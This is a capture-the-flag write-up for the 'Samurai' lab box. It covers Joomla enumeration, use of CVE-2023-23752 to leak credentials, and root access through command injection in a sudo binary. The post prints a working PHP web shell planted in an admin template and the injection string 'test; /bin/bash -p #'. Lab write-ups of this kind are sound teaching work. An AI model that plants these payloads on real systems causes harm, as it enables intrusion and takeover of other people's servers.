---
title: "Samurai @ HackSmarter"
date: 2026-05-16
categories: [HackSmarter, Easy]
tags: [Joomla, Command Injection]
image:
  path: /assets/sam.png
---

![image description](/assets/sam.png)


### Objective 
The objective of this penetration test is to evaluate an interesting target web server. The goal is to perform initial reconnaissance, discover web vulnerabilities to establish a foothold, and identify local configuration flaws to escalate privileges to root.

### Initial Enumeration:~#

We initiate our discovery phase with an optimized Nmap scan to detect open ports, active services, and system versions on the target IP 10.1.131.123.
```
~> /hacksmarter nmap 10.1.131.123 -sVC --min-rate 1000
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-16 11:56 -0500
Nmap scan report for 10.1.131.123
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c3:5a:83:50:80:9a:61:37:05:b7:45:96:cb:ab:1d:1e (ECDSA)
|_  256 6b:15:12:60:1b:21:d1:bf:7e:b8:c0:e8:d7:7e:7b:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Samurai
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Looking at the webpage:~#
The webpage just shows a default page with nothing interesting
![image description](/assets/image%20(1).png)

I moved on to launch dirsearch to map out the hidden web directory structure.

```
~> /hacksmarter dirsearch -u http://10.1.131.123/

[11:58:51] 301 -  320B  - /administrator  ->  http://10.1.131.123/administrator/
[11:58:51] 301 -  325B  - /administrator/logs  ->  http://10.1.131.123/administrator/logs/
[11:58:58] 200 -    4KB - /administrator/index.php
[11:59:08] 200 -    0B  - /configuration.php
[11:59:23] 200 -    3KB - /htaccess.txt

```

The scan flags a significant number of directory structures indicative of a content management framework

### Foothold: Joomla Enumeration:~#
Navigating to the `/administrator` directory confirms that the site runs a Joomla content management system panel.
![image description](/assets/image%20(2).png)


To gather more precise intelligence on the deployment, I scanned the site layout using joomscan
![image description](/assets/image%20(3).png)

The scan identified a vulnerable Joomla installation prone to CVE-2023-23752 (an Improper Access Control vulnerability leading to unauthorized REST API disclosure).

Using a public exploit script targeting this vulnerability, I successfully extracted internal database and system configurations from the exposed API endpoint:

`https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT`

![image description](/assets/image%20(4).png)

The exploit successfully pulled valid system database configurations:
```
Extracted User: joomla425
Extracted Password: Pa847word987@Joomla456
```

### Gaining Access via Template Modification:~#
Leveraging these credentials against the Joomla administrator portal and established a valid session. A secondary system profile reuse discovery gave us a potential lateral pivot:
`Miyamoto : Pa847word987@Joomla456`

Because our administrator privileges grant backend code modification rights, I edited an existing core php file in the "atum" layout theme to embed a lightweight web shell.

Payload used:
`<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>`

![image description](/assets/image%20(6).png)

Triggering our embedded command parameter allowed us to execute system instructions. We stabilize our interaction by executing a reverse connection, landing an interactive shell on port 22 as the service account user `www-data`.

![image description](/assets/image%20(8).png)

# User flag
With our foothold established, we retrieved the user flag in `/var/www/flag.txt`

`flag{Tachi_794–1185}`

### Privilege Escalation:~#
I began internal host assessment with manual enumeration. Checking directory contents under the /opt revealed an unconventional, custom native binary resource located inside /opt/backup:

![image description](/assets/image%20(7).png)

Checking my current account execution permissions with `sudo -l` reveals that `www-data` can run this custom file with root-level privileges without an authentication prompt:

```
www-data@streetcoder:/opt/backup$ sudo -l
sudo -l
Matching Defaults entries for www-data on streetcoder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on streetcoder:
    (root) NOPASSWD: /opt/backup/DbMaria
www-data@streetcoder:/opt/backup$
```

I inspected the inner strings of the compiled DbMaria binary using the `strings` utility to see how it operates under the hood.
```
strings /opt/backup/DbMaria
```

![image description](/assets/image%20(9).png)


The output reveals an insecure programmatic flow that passes unvalidated user arguments directly into a system invocation command. This pattern makes the binary highly vulnerable to command injection.

By appending a semicolon followed by a privileged bash execution flag (-p to preserve root identity state) and commenting out the rest of the original intended binary parameter with #, we can successfully hijack the control flow:

```
sudo /opt/backup/DbMaria 'test; /bin/bash -p #'
```

![image description](/assets/image%20(10).png)

Navigating to the root home directory allows us to extract the root flag:

`flag{Katana_1603–1868}`


Happy hacking!!!!
